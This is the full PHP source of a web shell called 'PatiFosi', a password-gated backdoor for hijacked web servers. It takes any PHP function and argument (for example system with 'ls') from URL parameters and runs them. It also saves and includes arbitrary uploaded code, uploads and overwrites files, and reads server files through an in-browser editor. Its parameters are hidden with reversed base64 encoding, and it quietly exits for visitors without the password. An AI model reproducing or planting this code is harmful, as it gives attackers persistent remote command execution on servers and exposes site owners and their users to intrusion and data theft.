<?php
error_reporting(0);
header("X-XSS-Protection: 0");

//config login
// localhost/patifosi.php?login=gans
$param = 'login';                             // login input
$pw    = 'e5e32f8c9a2e843080f5176871e8cd32'; // md5 password default = gans
$inDir = true;                             // true or false, to enable input dir
$out   = 'exit;';                         // string, not login
$enc   = true;                           // js must enabled, editor & upload not encoded
$img   = 'https://media.giphy.com/media/XoxPRR71OevDzqllyt/giphy.gif';

// variable
$dirGet = $_GET['dir'];
$dirGET = $_GET['dir'];
$file   = $_GET['file'];
$func   = $_GET['func'];
$arg    = $_GET['arg'];
$mode   = $_GET['mode'];
$type   = $_GET['type'];
$pass   = $_GET[$param];
$md5    = md5("$_GET[$param]");
$host   = $_SERVER['HTTP_HOST'];
$uplto  = $_POST['uplto'];
$saveto = $_POST['saveto'];
$file   = $_POST['file'];

// decode
function dec($str){
    $str = base64_decode(strrev("$str"));
    return str_replace('=', '-', "$str");
}

if($enc == true && isset($dirGet)){
    $dirGet = dec($dirGet);
    $func   = dec($func);
    $arg    = dec($arg);
    $uplto  = dec($uplto);
    $saveto = dec($saveto);
    $file   = dec($file);
};

// login
if($md5 !== $pw){
    die("$out");
    exit;
}

// tq
$w = array("pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "patiUndetektet", "date"=>"28 Mei 2018");
 // sorry for bad code //
// just for fun       //

// checked type
if($type){
  $typeChecked = "checked";
};

// chdir
if($dirGet){
  chdir($dirGet);
};

// directory
$dirNow = getcwd();

// button encode
if($enc){
  $encButton = 'enc()';
}else{
  $encButton = '';
};

// input dir
if($inDir){
  $inputDir = "<th style='display:inline-block'>dir<br><input class='encode' type='text' name='dir' value='$dirNow' placeholder='/var/www/html'> </th>";
} else {
  $Hidinput = "<input class='encode' type='hidden' name='dir' value='$dirNow'>";
};

// codemirror library in mode=edit
if($mode == edit){
  $codemirror = "
  <script src='//codemirror.net/lib/codemirror.js'></script>
  <link rel='stylesheet' href='//codemirror.net/lib/codemirror.css'>
  <script src='//codemirror.net/mode/javascript/javascript.js'></script>
  <link rel='stylesheet' href='//codemirror.net/theme/monokai.css'>
  <script src='//codemirror.net/addon/edit/matchbrackets.js'></script>
  ";
};

// ?mode=iframe
if($mode == iframe){
  die("<title>PatiFosi</title><link rel='icon' href='$img' type='image/gif'><iframe src='?$param=$pass&mode=command' style='position:fixed; top:0px; bottom:0px; right:0px; width: 100%; border: none; margin:0; padding:0; overflow: hidden; z-index:999999; height: 100%;'></iframe>");
  exit;
}

// run code
if($_POST['run']){
    $code = $_POST['code'];

    if($_POST['tmp']){
        $tmp_file = dec($_POST['tmp']);
    }else{
        $tmp_file = tempnam(sys_get_temp_dir(), '');
    };

    if(file_put_contents("$tmp_file","$code")){
        $tmp_run = "<mark style='background: #ffffff'><a href='?$param=$pass&run=$tmp_file' target='_blank' style='color:#2ed573'> run click here</a> -> $tmp_file";
    }else{
    	$tmp_run = "<mark style='background: #ffffff'><a style='color:#ff4757'> failed saving tmp -> $tmp_file";
    };
};
if($_GET['run']){
    $run = $_GET['run'];
    include "$run";
    exit;
};

// header html
echo "<html>
<head>
<title>PatiFosi</title>
<link rel='icon' href='$img' type='image/gif'>
<style>
#clear { text-decoration: none; }
.shadow {
    -moz-box-shadow: 4px 5px 7px rgba(0, 0, 0,0.5);
    -webkit-box-shadow: 4px 5px 7px rgba(0, 0, 0, .5);
    box-shadow: 4px 5px 7px rgba(0, 0, 0, .5);
}
input { background-color: #ffffff; color: #2f3542; }
</style>
$codemirror

<script>
function rev(str) {
    return str.split('').reverse().join('');
}

function enc() {
    var x = document.getElementsByClassName('encode');
    var i;
    for (i = 0; i < x.length; i++) {
        x[i].value = rev(btoa(x[i].value)).replace('=', '-');
    }
}
</script>
</head>

<body style='padding:5%; padding-top:2%; border: 3px solid #2f3542; font-family: Arial, Helvetica, sans-serif; background:#f1f2f6;'>
<center><h1 style='color:#2f3542'>PatiFosi</h1></center>
<a style='font-size:10; color:#ff4757'>$host</a>
<a style='font-size:10; color:#a4b0be'>@</a>
<a style='font-size:10; color:#2f3542'>$dirNow</a>
<a style='font-size:10; color:#ff4757' href='?$param=$pass'>[Home]</a><center>
<div style='background-color: #ff6b81'>
<a id='clear' style='color:#57606f' href='?$param=$pass&mode=command&dir=$dirGET'>[command] - </a>
<a id='clear' style='color:#57606f' href='?$param=$pass&mode=edit&dir=$dirGET'>[edit] - </a>
<a id='clear' style='color:#57606f' href='?$param=$pass&mode=about&dir=$dirGET'>[about] </a>
</div>
<br><br>
";


// mode command
if ($mode == "command") {
  echo " <form  method='get'>
      <table id='clear' style='text-align:center'>
          <input type='hidden' name='$param' value='$pass'>
          <input type='hidden' name='mode' value='command'>
          $Hidinput
          <tr>
          $inputDir
            <th style='display:inline-block'>func<br><input class='encode' type='text' name='func' value='$func' placeholder='system'> </th>
            <th style='display:inline-block'>arg<br><input class='encode' type='text' name='arg' value='$arg' placeholder='ls'>  </th> 
            <td><br><input type='checkbox' name='type' value='checked' $typeChecked >array   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
          </td>
          </tr>
        </table>
      </form>
      </center><br>
      <pre style='background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;'>";
      
          if($type == 'checked'){
          echo "<i>var_dump($func($arg));</i><br>";
          @var_dump($func($arg));
        } else {
          echo "<i>die($func($arg));</i><br>";
          @die($func($arg));
        }


// mode edit
  } elseif ($mode == "edit") {
      echo "
      
      <form  method='get'>
      <table id='clear' style='text-align:center'>
          <input type='hidden' name='$param' value='$pass'>
          <input type='hidden' name='mode' value='edit'>
          $Hidinput
          <tr>
          $inputDir
            <th style='display:inline-block'>func<br><input class='encode' type='text' name='func' value='$func' placeholder='file_get_contents'> </th>
            <th style='display:inline-block'>arg<br><input class='encode' type='text' name='arg' value='$arg' placeholder='file.php'>  </th> 
            <td><br><input type='checkbox' name='type' value='ob' $typeChecked>ob   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
          </td>
          </tr>
        </table>
      </form></center>
      <div align='right'>
      <button class='shadow' type='button' onclick='fullN()' style='border-radius: 50%; border: none; background-color: #eccc68; color: #f1f2f6; text-align:right'>_</button>
      <button class='shadow' type='button' onclick='full()' style='border-radius: 50%; border: none; background-color: #2ed573; color: #f1f2f6; text-align:right'>_</button>
      <button class='shadow' type='button' onclick='reset()' style='border-radius: 50%; border: none; background-color: #ff4757; color: #f1f2f6; text-align:right'>_</button>
      <br></div>
      <form  method='post' action='?$param=$pass&mode=edit&dir=$dirGET&type=$type' enctype='multipart/form-data'>
      <div class='shadow'><textarea id='codemirror' name='code' style='width:100%; height: 50%;'>";
   // codemirror
      if(!empty($_GET['func']) && !empty($_GET['arg'])){
        if($_GET['type'] !== 'ob'){
          echo(htmlspecialchars($func($arg)));
        } else {
          ob_start();
          htmlspecialchars($func($arg));
          $run = ob_get_clean();
          echo(htmlspecialchars($run));
        };
      }elseif($_POST['code']){
        echo(htmlspecialchars($_POST['code']));
      };

      echo "</textarea></div><br><input type='hidden' name='tmp' class='encode' value='$tmp_file'><input onclick='$encButton' type='submit' name='run' value='run >>' style='background-color: #747d8c;color: #f1f2f6; float: right;'>

    <table style='width:100%'>
    <tr style='text-align:center'>
    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input class='encode' type='text' name='uplto' value='$uplto' placeholder='$dirNow'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input onclick='$encButton' type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
    </th>
    <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input class='encode' type='text' name='saveto' value='$saveto' placeholder='$dirNow'><br><input class='encode' type='text' name='file' value='$file' placeholder='file.php'><br><input onclick='$encButton' type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
    </form></th>
    </tr>
    </table>
    <script>
        var myCodeMirror = CodeMirror.fromTextArea(document.getElementById('codemirror'), {
            theme: 'monokai',
            lineNumbers: true,
            matchBrackets: true,
            mode: 'javascript',
            viewportMargin: false,
        });

        function full(){
          myCodeMirror.setSize('100%', '100%');
        }

        function fullN(){
          myCodeMirror.setSize('100%', '60%');
        }

        function reset() {
            var txt;
            if (confirm('Ar u sure wanna reset d code?')) {
                myCodeMirror.setValue('');
            }
        }
    </script>
    ";
    echo "<center><hr style='border-top: 1px solid #dfe4ea' width='90%'><h4>";
    if(isset($_POST['savesubmit'])){
      if(!chdir($saveto)){
        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist -> $saveto");
      };

      $write = file_put_contents($file, $_POST['code']);
		  if($write) {
			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved -> $file");
		  } else {
			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed save -> $file");
      }

    } elseif(isset($_POST['uploadsubmit'])){
      if(!chdir($uplto)){
        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist -> $uplto");
      };

      $uploadname = $_FILES['datupload']['name'];
      $uploadtmp = $_FILES['datupload']['tmp_name'];
      $write = copy($uploadtmp, $uploadname);
      if($write) {
			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> uploaded -> $uploadname");
		  } else {
			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed upload -> $uploadname");
		  }
    } elseif($tmp_run){
        die("$tmp_run");
    };


// mode about
  } elseif ($mode == "about") {
    echo '</center><pre style="background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;"><i>var_dump($w);</i><br>';
    echo var_dump($w);
  } else {
      echo "<img src='$img'><br>what ar u doin?<br><br><a style='font-size:10; color:#ff4757' href='?$param=$pass&mode=iframe'>[Go to iframe mode]</a>
      <noscript><i>javascript isn't running</i></noscript><script>
      if(!navigator.onLine) {
        alert('u must connect internet for best experience');
      }
      </script>";
};

